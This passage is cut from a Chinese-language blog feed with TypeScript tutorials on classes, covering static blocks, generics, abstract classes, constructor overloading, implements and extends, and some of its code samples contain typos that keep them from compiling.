src="/Blog/2023/06/14/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9Aclass%EF%BC%88%E4%B8%8B%EF%BC%89/index/img_1.png"><br>class 是个 function，且自然自带 name，这样看来，JS 中的 class 就是辣鸡，看起来实现了 class，但又好像是个残废，所以有关固有属性的都会报错</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="attr">length</span>: <span class="built_in">string</span> <span class="comment">// <span class="doctag">TODO:</span> 报错啦</span></span><br><span class="line">  <span class="keyword">static</span> <span class="attr">prototype</span>: <span class="built_in">string</span> <span class="comment">// <span class="doctag">TODO:</span> 报错啦</span></span><br><span class="line">  <span class="keyword">static</span> <span class="attr">arguments</span>: <span class="built_in">string</span> <span class="comment">// <span class="doctag">TODO:</span> 报错啦</span></span><br><span class="line">  <span class="keyword">static</span> <span class="attr">caller</span>: <span class="built_in">string</span> <span class="comment">// <span class="doctag">TODO:</span> 报错啦</span></span><br><span class="line">  <span class="attr">name</span>: stirng</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="static-block"><a href="#static-block" class="headerlink" title="static block"></a>static block</h2><p>需求是这样：我们想记录这个功能被创建过多少次？</p><p>如果是 JS 程序员，那么很简单</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> count = <span class="built_in">parseInt</span>(loocalStorage.<span class="title function_">getItem</span>(<span class="string">&#x27;count&#x27;</span>) || <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">count += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>如果是在 class 里面那就很难做到，除非~<strong>再加个语法</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> #count = <span class="number">0</span></span><br><span class="line">  <span class="keyword">static</span> &#123; <span class="comment">// <span class="doctag">TODO:</span> 注意这里，这种语法代表类在创建的时候会执行</span></span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">loadFrimLocalStorage</span>() || <span class="number">0</span></span><br><span class="line">    <span class="title class_">Foo</span>.#count += count</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Foo</span>.#count)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类和泛型"><a href="#类和泛型" class="headerlink" title="类和泛型"></a>类和泛型</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hash</span>&lt;K, V&gt; &#123;</span><br><span class="line">  <span class="attr">map</span>: <span class="title class_">Map</span>&lt;K, V&gt; = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">  <span class="title function_">set</span>(<span class="params">key: K, value: V</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">set</span>(key, value)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">get</span>(<span class="params">key: K</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">map</span>.<span class="title function_">get</span>(key)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> h = <span class="keyword">new</span> <span class="title class_">Hash</span>&lt;<span class="built_in">string</span> | <span class="built_in">number</span>, <span class="built_in">string</span> | <span class="built_in">number</span>&gt;()</span><br><span class="line">h.<span class="title function_">set</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;hi&#x27;</span>)</span><br><span class="line">g.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure><p>其实上面这个 Hash 就是一个 Map，那么直接用继承就好了</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hash</span>&lt;K, V&gt; <span class="keyword">extends</span> <span class="title class_">Map</span>&lt;K, V&gt; &#123;</span><br><span class="line">  <span class="title function_">destory</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">clear</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> A &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>interface 只能写类型，不写实现<br>class 又写类型，又写实现<br>人都喜欢折中<br>能不能有的实现，有的不实现呢？<br>为了应对这个需求，又来到了面向对象熟悉的操作，<strong>加关键字</strong>， abstract</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="keyword">abstract</span> <span class="attr">b</span>: <span class="function">() =&gt;</span> <span class="built_in">number</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是抽象类，请注意这个抽象类是不能直接使用的！</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 报错：Cannot Create an Instance of an abstract class.ts</span></span><br></pre></td></tr></table></figure><h2 id="把类当作参数（常用）"><a href="#把类当作参数（常用）" class="headerlink" title="把类当作参数（常用）"></a>把类当作参数（常用）</h2><p>把类作为参数，而不是把对象作为参数</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">X: Person</span>) &#123; <span class="comment">// <span class="doctag">TODO:</span> typescript 报错</span></span><br><span class="line">  <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title function_">X</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fn</span>(<span class="title class_">Person</span>)</span><br></pre></td></tr></table></figure><p>怎么解决呢？下面两种方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种：</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn1</span>(<span class="params">X: <span class="keyword">typeof</span> Person</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title function_">X</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种：</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn2</span>(<span class="params">X: <span class="keyword">new</span> (name: string) =&gt; Person</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title function_">X</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>看起来很奇怪把~</p></blockquote><h2 id="个人对-class-的看法"><a href="#个人对-class-的看法" class="headerlink" title="个人对 class 的看法"></a>个人对 class 的看法</h2><p>有这么多关键字，有这么多语法，搞的像背书一样，每个关键字是什么意思，怎么组合，该怎么声明类型，全都是固定的，都是套路，都是模版，有什么好处呢？</p><p>那就是工业化，千人一面，大家写出来的代码都是一样的，即使你是新手，你也能看懂老手的代码，大家沟通起来就简单多了。</p><p>如果说面向对象适合前端就罢了，但是实际上来看，虽然以前转向前端的都是面向随想那帮人，他们自然而然在写前端时候会加入各种组合，各种设计模式，</p><p>但是从 ES6 开始，前端就希望代码更加简化，希望更多的函数和对象组合，虽然这个时候出了真正的关键词 class，但是很多前端就是不用，你 class 的功能我全都可以用函数和对象来实现，直到今年 react 和 vue 都出了 hooks API，他们连 this 都不用了，更不用说 new 了，所以事实证明，不用 class 也能写出很好的程序。</p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：class（上）</title>
      <link href="/Blog/2023/06/14/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9Aclass%EF%BC%88%E4%B8%8A%EF%BC%89/index/"/>
      <url>/Blog/2023/06/14/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9Aclass%EF%BC%88%E4%B8%8A%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>为什么需要类呢？</p><ol><li>外来人口多，迫切需要 class（以前是没有专门的前端的，都是其他方向转行来的）</li><li>class 是保留字，迟早要实现 class</li><li>大部分人对原型的理解不够（因为大多数都语言是使用 class 来描述面向对象）</li></ol></blockquote><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PointClass</span> &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span> = <span class="number">0</span></span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span> = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PointClass</span> &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span></span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">x</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span> = <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法三</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PointClass</span> &#123;</span><br><span class="line">  x!: <span class="built_in">number</span> <span class="comment">// 这里必须断言，因为初始化不在 constructor 的明面上</span></span><br><span class="line">  y!: <span class="built_in">number</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">xxx</span>()  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">xxx</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">x</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span> = <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来看一组对比：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">PointInterface</span> &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 注意：下面这个示例在 JS 中可以的，在 TS 中会报错</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PointClass</span> &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>看起来很像是吧~<br>interface 只有成员的类型<strong>没有实现</strong><br>class <strong>须同时</strong>有成员的类型和实现</p></blockquote><p>其实这个才是我最喜欢的写法：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> x: <span class="built_in">number</span> = <span class="number">0</span>, <span class="keyword">public</span> y: <span class="built_in">number</span> = <span class="number">0</span></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">  x!: <span class="built_in">number</span>;</span><br><span class="line">  y!: <span class="built_in">number</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>);</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">s: <span class="built_in">string</span></span>);</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">xs: <span class="built_in">number</span> | <span class="built_in">string</span>, y?: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> xs === <span class="string">&#x27;number&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> y === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">x</span> = xs</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">y</span> = y</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> parts = xs.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">x</span> = <span class="built_in">parseFloat</span>(parts[<span class="number">0</span>])</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">y</span> = <span class="built_in">parseFloat</span>(parts[<span class="number">1</span>])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来有点复杂把~</p><h2 id="class-可以实现接口"><a href="#class-可以实现接口" class="headerlink" title="class 可以实现接口"></a>class 可以实现接口</h2><p>使用 implements</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">sayHi</span>: <span class="function">(<span class="params">target: Person</span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">sayHi</span>(<span class="params">target: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hi <span class="subst">$&#123;target.name&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>实现是什么意思？就是你有的我都有，那这个不是和继承差不多嘛<br>确实差不多，但是你“继承”一个接口，就叫做实现。接口继承接口，类继承类，那才叫做继承<br>面向对象对就喜欢整这些有的没的的概念</p></blockquote><p>实现两个接口</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">sayHi</span>: <span class="function">(<span class="params">target: Person</span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Tag</span> &#123;</span><br><span class="line">  <span class="attr">tag</span>: <span class="built_in">string</span>[];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Person</span>, <span class="keyword">interface</span> &#123;</span><br><span class="line">  <span class="attr">tag</span>: <span class="built_in">string</span>[] = []</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">sayHi</span>(<span class="params">target: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hi <span class="subst">$&#123;target.name&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思考：来看一个问题"><a href="#思考：来看一个问题" class="headerlink" title="思考：来看一个问题"></a>思考：来看一个问题</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  age?: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">sayHi</span>: <span class="function">(<span class="params">target: Person</span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">sayHi</span>(<span class="params">target: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hi <span class="subst">$&#123;target.name&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> u = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;jack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">u.<span class="property">age</span> <span class="comment">// <span class="doctag">TODO:</span> 这里会出现什么样的结果</span></span><br></pre></td></tr></table></figure><blockquote><p>问：u.age 的值是多少？</p><ol><li>0</li><li>undefined</li><li>typescript 报错</li></ol><p>很显然是报错，<br>Person 是一个接口啊，又不会帮你实现，你的 User 也没有实现 age，所以是报错</p></blockquote><h2 id="class-可以继承-class"><a href="#class-可以继承-class" class="headerlink" title="class 可以继承 class"></a>class 可以继承 class</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hi <span class="subst">$&#123;thyis.name&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> id: <span class="built_in">number</span>, name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(name)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">login</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">sayHi</span>(<span class="params">target?: User</span>) &#123; <span class="comment">// <span class="doctag">TODO:</span> 注意：这叫做重写</span></span><br><span class="line">    <span class="keyword">if</span> (target === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      supper.<span class="title function_">sayHi</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;target.name&#125;</span>， 我是<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意这里需要调用 super<br>为什么是这个单词？因为面向对象他又来了，<br>通常我们都说父类和子类，而偏偏面向对象要叫做<strong>超类</strong>，就是喜欢发明概念</p></blockquote><h2 id="关于重写的一个思考"><a href="#关于重写的一个思考" class="headerlink" title="关于重写的一个思考"></a>关于重写的一个思考</h2><p>再来看一个栗子</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  friend?: <span class="title class_">Person</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span>, friend?: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">friend</span> = friend</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> id: <span class="built_in">number</span>, name: <span class="built_in">string</span>, friend?: User</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(name, friend)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">login</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">sayHi</span>(<span class="params">target?: User</span>) &#123; <span class="comment">// <span class="doctag">TODO:</span> 注意：这叫做重写</span></span><br><span class="line">    <span class="keyword">if</span> (target === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      supper.<span class="title function_">sayHi</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;target.name&#125;</span>， 我是<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> u1 = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&#x27;jack&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> u2 = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&#x27;jack2&#x27;</span>, u1)</span><br><span class="line"></span><br><span class="line">u2.<span class="property">friend</span> <span class="comment">// <span class="doctag">TODO:</span> 请问这里的类型是什么</span></span><br></pre></td></tr></table></figure><p>请问这里的 <code>u2.friend</code> 类型是什么？</p><p>直接看答案：</p><p><img src="https://upload-images.jianshu.io/upload_images/5780538-c8bac00f788c1346.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><blockquote><p>很奇怪把，明明传进去的 u1，类型是 User，怎么显示出来是 Person？！</p><p>可能是因为我们在 User 的时候并没有实现 friend，friend 是在 Person 实现的，自然会用 Person 里的 friend 的类型<br>所以我们要怎么做呢？用类型重写</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  friend?: <span class="title 